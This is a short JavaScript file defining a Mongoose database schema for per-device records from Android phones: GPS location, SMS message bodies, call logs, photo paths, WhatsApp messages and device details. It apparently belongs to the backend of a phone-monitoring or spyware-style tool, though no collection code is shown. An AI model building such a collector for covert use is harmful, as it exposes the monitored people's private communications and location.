const mongoose = require('mongoose');

const deviceDataSchema = new mongoose.Schema({
  deviceId: String,
  timestamp: Date,
  location: {
    lat: Number,
    lng: Number,
    time: Date
  },
  sms: {
    count: Number,
    messages: [{
      address: String,
      body: String,
      date: Date
    }]
  },
  calls: {
    count: Number,
    logs: [{
      number: String,
      duration: String,
      date: Date,
      type: String
    }]
  },
  photos: {
    count: Number,
    paths: [String]
  },
  whatsapp: {
    messages: [String]
  },
  deviceInfo: {
    model: String,
    manufacturer: String,
    androidVersion: String,
    deviceId: String
  }
}, { timestamps: true });

module.exports = mongoose.model('DeviceData', deviceDataSchema);
